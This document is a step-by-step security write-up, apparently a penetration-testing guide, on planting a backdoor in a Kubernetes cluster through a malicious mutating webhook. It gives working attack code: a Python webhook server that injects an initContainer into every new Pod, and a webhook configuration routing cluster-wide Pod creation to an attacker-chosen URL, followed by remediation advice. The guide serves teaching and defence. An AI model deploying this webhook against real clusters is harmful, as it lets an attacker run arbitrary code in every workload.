# Kubernetes Mutating Webhook Backdoor Installation

## 1. Overview

This document outlines the vulnerability of installing a backdoor via a mutating webhook in a Kubernetes cluster.  A mutating webhook allows an attacker to modify Kubernetes objects, such as Pods, Deployments, or Services, at the time of creation or update. By installing a malicious webhook, an attacker can inject arbitrary code, modify configurations, or redirect traffic, effectively gaining control over workloads within the cluster.

**Attack Vector Description:**

The attacker exploits inadequate authorization controls or misconfigurations to deploy a malicious mutating webhook configuration. This webhook intercepts object creation or updates and injects malicious code or configurations into the targeted resources.

**Potential Impact and Consequences:**

*   **Complete Cluster Compromise:** The attacker gains the ability to inject code into any Pod, potentially allowing them to steal secrets, escalate privileges, and gain control over the entire cluster.
*   **Data Exfiltration:** Malicious webhooks can intercept and exfiltrate sensitive data from Pods or network traffic.
*   **Denial of Service (DoS):** The attacker can modify deployments to cause failures, disruptions, or complete service outages.
*   **Supply Chain Attack:** Injecting vulnerabilities into applications deployed through the cluster.

**Risk Level Assessment:**

**Critical**

**Technical Explanation:**

This vulnerability arises because of:

*   **Insufficient RBAC controls:** Lack of proper Role-Based Access Control (RBAC) allows unauthorized users or service accounts to create or modify MutatingWebhookConfiguration objects.
*   **Unvalidated Webhook Endpoints:** The webhook endpoint is not properly validated, allowing the attacker to point the webhook to a malicious server.
*   **Lack of Monitoring and Auditing:** Absence of monitoring and auditing mechanisms makes it difficult to detect the creation or modification of malicious webhooks.
*   **Overly Permissive Admission Controllers:** A general lack of restrictive admission policies allows the execution of the malicious webhook.

**Prerequisites and Conditions Needed:**

*   **Kubernetes Cluster:** A running Kubernetes cluster with at least one node.
*   **Sufficient Permissions:** An attacker must have sufficient RBAC permissions to create or modify MutatingWebhookConfiguration objects. This often involves access to cluster-admin or edit roles in specific namespaces.
*   **Network Access:** Network access to the Kubernetes API server and potentially to nodes in the cluster to deploy malicious containers or webhooks.
*   **Ability to deploy to the cluster:** Knowledge of deploying resources, and the means to do so (kubectl, Helm, etc.)

## 2. Validation and Exploitation Steps

This section outlines the steps to validate and exploit the mutating webhook backdoor installation vulnerability.

**Phase 1: Validation - Identifying Vulnerable Cluster**

**Step 1: Check Current RBAC Permissions**

```bash
kubectl auth can-i create mutatingwebhookconfigurations.admissionregistration.k8s.io
```

**Explanation:**

This command checks if the currently logged-in user or service account has the permission to create MutatingWebhookConfiguration resources.

**Why:**

Verifying permissions is the initial step to assess the attack surface. If the user has the permission to create mutating webhooks, the vulnerability is potentially exploitable.

**Expected Output:**

If the user has permission, the output will be:

```
yes
```

If the user lacks permission, the output will be:

```
no
```

**Contribution:**

This confirms if the current user has the necessary privileges for the attack.

**Alternative Approaches:**

Use `kubectl get clusterrolebindings` and `kubectl get rolebindings -A` to examine explicit bindings to users and groups. This can reveal broader permission assignments.

**Step 2: List Existing Mutating Webhook Configurations**

```bash
kubectl get mutatingwebhookconfigurations
```

**Explanation:**

This command lists all existing mutating webhook configurations in the cluster.

**Why:**

To identify existing webhooks, examine their configuration, and look for potential vulnerabilities such as overly broad scope or insecure endpoints.

**Expected Output:**

A list of mutating webhook configurations, or an empty list if none exist.

```
NAME                                               WEBHOOKS   AGE
my-existing-webhook                                1          10d
```

**Contribution:**

Provides information about existing webhooks and their potential scope. If any existing webhooks appear overly permissive, they might be used as a proxy.

**Step 3: Inspect Webhook Configurations**

```bash
kubectl get mutatingwebhookconfigurations <webhook-name> -o yaml
```

**Explanation:**

This command retrieves the YAML definition of a specific mutating webhook configuration. Replace `<webhook-name>` with the actual name of a webhook from the previous step.

**Why:**

Inspecting the YAML configuration reveals crucial details about the webhook, including:

*   `clientConfig.url`: The endpoint to which the webhook sends requests.
*   `rules`: The resources and operations the webhook intercepts (e.g., creating pods in all namespaces).
*   `namespaceSelector` & `objectSelector`: These selectors dictate which objects will be sent to this webhook.
*   `failurePolicy`: How the cluster should behave when the webhook fails.

**Expected Output:**

The YAML representation of the mutating webhook configuration.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: my-existing-webhook
webhooks:
- admissionReviewVersions:
  - v1beta1
  clientConfig:
    service:
      name: my-service
      namespace: my-namespace
    url: "https://example.com/mutate"
  failurePolicy: Fail
  matchPolicy: Equivalent
  name: my-webhook.example.com
  namespaceSelector: {}
  objectSelector: {}
  rules:
  - apiGroups:
    - '*'
    apiVersions:
    - '*'
    operations:
    - CREATE
    - UPDATE
    resources:
    - pods
    scope: '*'
  sideEffects: Unknown
  timeoutSeconds: 30
```

**Contribution:**

This step allows you to identify potential misconfigurations, such as webhooks with wide-ranging rules, unsecured endpoints, or permissive failure policies.  Pay close attention to `rules` and `clientConfig`.

**Phase 2: Exploitation - Injecting the Backdoor**

**Step 4: Create a Malicious Webhook Server**

This step involves setting up a server that will act as the malicious webhook. This example utilizes a simple Python HTTP server with a handler that injects an initContainer into Pods.  For simplicity, we will assume the malicious webhook is deployed outside the cluster.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        json_data = json.loads(post_data.decode('utf-8'))

        # Inject initContainer to run malicious command
        json_data['response'] = {
            'allowed': True,
            'patchType': 'JSONPatch',
            'patch': json.dumps([
                {'op': 'add', 'path': '/spec/initContainers', 'value': [{
                    'name': 'malicious-init',
                    'image': 'busybox',
                    'command': ['/bin/sh', '-c', 'echo "Malicious code executed!" > /output/evil.txt; sleep 3600'],
                    'volumeMounts': [{'name': 'output-volume', 'mountPath': '/output'}]
                }]},
                {'op': 'add', 'path': '/spec/volumes', 'value': [{'name': 'output-volume', 'emptyDir': {}}] }
            ])
        }

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(json_data).encode('utf-8'))

def run():
    print('Starting webhook server...')
    server_address = ('', 8443) # Use a non-standard port to avoid collisions
    httpd = HTTPServer(server_address, RequestHandler)
    print('Webhook server running on port 8443...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()

```

**Explanation:**

This Python script creates a simple HTTP server that listens on port 8443. It intercepts POST requests (which are the admission review requests from Kubernetes), parses the JSON payload, and constructs a JSON patch to inject an `initContainer` into the Pod specification. This `initContainer` executes a simple command ("Malicious code executed!") and sleeps for an hour, ensuring that the backdoor process runs in parallel with the main container processes.  This injects a simple file creation to demonstrate.

**Why:**

This serves as the malicious webhook endpoint that will modify Pods based on configured rules.  A real attack would involve more sophisticated and stealthy malicious code.

**Expected Output:**

The server will start and print "Webhook server running on port 8443...".

**Contribution:**

Provides the endpoint the Kubernetes cluster will contact to modify Pods.

**Step 5: Create a MutatingWebhookConfiguration**

Create a YAML file (e.g., `malicious-webhook.yaml`) with the following content:

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: malicious-webhook
webhooks:
- admissionReviewVersions:
  - v1
  clientConfig:
    url: "http://<your-server-ip>:8443" # Replace with your server IP
  failurePolicy: Fail
  matchPolicy: Equivalent
  name: malicious-webhook.example.com
  rules:
  - apiGroups:
    - ""
    apiVersions:
    - v1
    operations:
    - CREATE
    resources:
    - pods
    scope: '*'
  sideEffects: Unknown
  timeoutSeconds: 10
```

**Explanation:**

This YAML defines a MutatingWebhookConfiguration named `malicious-webhook`. It specifies that whenever a Pod is created (`operations: CREATE`) in any namespace (`scope: '*'`), the Kubernetes API server should send an admission review request to the specified URL (`clientConfig.url`).  `failurePolicy: Fail` means that pod creation will fail if the webhook is unreachable.

**Why:**

This configuration tells Kubernetes to forward Pod creation requests to the malicious webhook server. The server then has the opportunity to modify the Pod definition.

**Important:**

Replace `<your-server-ip>` with the actual IP address of the server running the malicious webhook.  In a real-world scenario, using HTTPS with proper certificate validation is expected for production environments. However, for this demonstration, we are using HTTP for simplicity. Ensure the Kubernetes cluster can resolve the specified hostname or IP address.

**Contribution:**

This YAML provides the definition for the malicious webhook, targeting Pod creations across the cluster.

**Step 6: Deploy the MutatingWebhookConfiguration**

```bash
kubectl apply -f malicious-webhook.yaml
```

**Explanation:**

This command deploys the MutatingWebhookConfiguration to the Kubernetes cluster.

**Why:**

This activates the webhook, causing all subsequent Pod creation requests to be sent to the malicious server.

**Expected Output:**

```
mutatingwebhookconfiguration.admissionregistration.k8s.io/malicious-webhook created
```

**Contribution:**

Enables the malicious webhook to intercept and modify Pod creation requests.

**Step 7: Verify the Backdoor Injection**

Create a simple Pod definition (e.g., `test-pod.yaml`):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  containers:
  - name: test-container
    image: nginx
```

Apply the Pod definition:

```bash
kubectl apply -f test-pod.yaml
```

Inspect the deployed Pod:

```bash
kubectl get pod test-pod -o yaml
```

**Explanation:**

Creating a simple Pod allows you to verify if the mutating webhook is successfully injecting the malicious `initContainer`. The `kubectl get pod` command retrieves the Pod's YAML definition, including any modifications made by the webhook.

**Why:**

This validates that the malicious webhook is functioning as expected, injecting the desired code into newly created Pods.

**Expected Output:**

The YAML output will include the injected `initContainer` and `volume`, similar to the following:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  initContainers:
  - command:
    - /bin/sh
    - -c
    - echo "Malicious code executed!" > /output/evil.txt; sleep 3600
    image: busybox
    name: malicious-init
    volumeMounts:
    - mountPath: /output
      name: output-volume
  containers:
  - image: nginx
    name: test-container
  volumes:
  - emptyDir: {}
    name: output-volume
```

Also, you can verify the contents of the `evil.txt` file using the following commands:

```bash
kubectl exec test-pod -c malicious-init -- cat /output/evil.txt
```

The expected output is

```
Malicious code executed!
```

**Contribution:**

Demonstrates the successful injection of malicious code into the Pod, confirming the vulnerability.

**Step 8: Cleanup (Remove Malicious Resources)**

Remove the malicious webhook configuration:

```bash
kubectl delete -f malicious-webhook.yaml
```

**Explanation:**

This command removes the malicious webhook configuration, preventing further modifications to Pods.

**Why:**

Cleaning up ensures that the cluster is returned to a safe state after testing the vulnerability.

**Expected Output:**

```
mutatingwebhookconfiguration.admissionregistration.k8s.io "malicious-webhook" deleted
```

**Contribution:**

Removes the malicious webhook, mitigating the vulnerability.

**Remediation Recommendations:**

1.  **Implement Least Privilege RBAC:**  Grant only the necessary permissions to users and service accounts. Limit the ability to create or modify MutatingWebhookConfiguration objects to authorized administrators only.
2.  **Validate Webhook Endpoints:** Implement strict validation of webhook endpoints. Use HTTPS with certificate validation to ensure secure communication between the API server and webhooks.
3.  **Implement Admission Control Policies:** Enforce policies to prevent the creation of overly permissive webhooks.  Use tools like OPA (Open Policy Agent) or Kyverno to define and enforce custom policies.
4.  **Implement Monitoring and Auditing:**  Enable auditing to track the creation and modification of MutatingWebhookConfiguration objects. Set up alerts to notify administrators of suspicious activity.
5.  **Regularly Review Webhook Configurations:** Periodically review existing webhook configurations to ensure they are still necessary and properly configured.
6.  **Network Policies:** Restrict network access to the Kubernetes API server to only authorized sources. Use network policies to limit the egress traffic from pods.
